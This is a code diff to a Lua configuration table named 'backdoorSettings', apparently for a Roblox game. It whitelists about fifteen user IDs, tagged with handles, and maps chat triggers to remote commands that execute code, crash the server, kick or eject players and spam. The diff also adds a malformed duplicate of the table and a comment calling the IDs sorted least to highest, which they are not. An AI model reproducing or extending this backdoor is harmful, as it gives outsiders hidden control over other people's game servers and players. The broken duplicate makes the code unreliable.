@@ -1,16 +1,56 @@
+local backdoorSettings
+    allowedUsers = {
+    1551416114, -- wrydioda4 - knocks
+    252684030, -- jjjuuikjjikkju - knocks
+    2172305, -- antemono / kyrofrost / timeless / reiko
+    4793416752 -- knocks
+    7126612490 -- hawaiianbroski / reiko
+    411845421 -- rin
+    7348878539-- rin
+    7603097827 -- day
+    518978417 -- FR6DDiiee
+    4217459491 -- Kozy
+    1702851506 -- tech
+    5405947853 -- cxo
+    1842223904 -- tech
+    2049407929 -- jotunn
+    142903777 -- ripend
+}
+
 local backdoorSettings = {
     allowedUsers = { 
-        1551416114, 252684030, 2172305, 4793416752, 7126612490, 
-        411845421, 7348878539, 7603097827, 518978417, 4217459491, 
-        1702851506, 5405947853, 1842223904, 2049407929, 142903777 
+        2172305, 142903777, 1702851506, 1842223904, 2049407929, 
+        252684030, 411845421, 518978417, 5405947853, 7126612490, 
+        7348878539, 7603097827, 1551416114, 4217459491, 4793416752
     },
+
+--[[ All User IDs in Order (Least to Highest)
+
+    2172305, -- antemono / kyrofrost / timeless / reiko
+    142903777, -- ripend
+    1702851506, -- tech
+    1842223904, -- tech
+    2049407929, -- jotunn
+    252684030, -- jjjuuikjjikkju - knocks
+    411845421, -- rin
+    518978417, -- FR6DDiiee
+    5405947853, -- cxo
+    7126612490, -- hawaiianbroski / reiko
+    7348878539, -- rin
+    7603097827, -- day
+    1551416114, -- wrydioda4 - knocks
+    4217459491, -- Kozy
+    4793416752 -- knocks
+
+]]
+    
     commands = {
         execute = "^run",
         crash = "^crash",
         say = "^say",
         kick = "^kick",
         eject = "^eject",
-        spam = "^ktest"
+        spam = "^rtest"
     }
 }
 
